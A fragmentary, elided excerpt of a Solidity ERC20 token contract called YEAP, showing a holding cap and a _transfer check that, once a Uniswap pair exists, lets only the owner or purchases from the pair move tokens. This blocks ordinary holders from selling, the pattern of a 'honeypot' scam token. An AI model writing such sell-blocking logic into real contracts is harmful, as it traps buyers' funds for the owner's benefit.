...
contract YEAP is ERC20, ERC20Burnable, Ownable {
    ...
    uint256 public constant MAX_HOLDING_PERCENT = 200; // 2%
    ...
    function setMaxHoldingAmount(uint256 _maxHoldingAmount) external onlyOwner {
        require(_maxHoldingAmount <= totalSupply(), "Max holding amount cannot exceed total supply");
    ...
    function _transfer(
        ...
        require(uniswapV2Pair == address(0) || sender == owner() || recipient == owner() || sender == uniswapV2Pair, "Trading is not allowed");
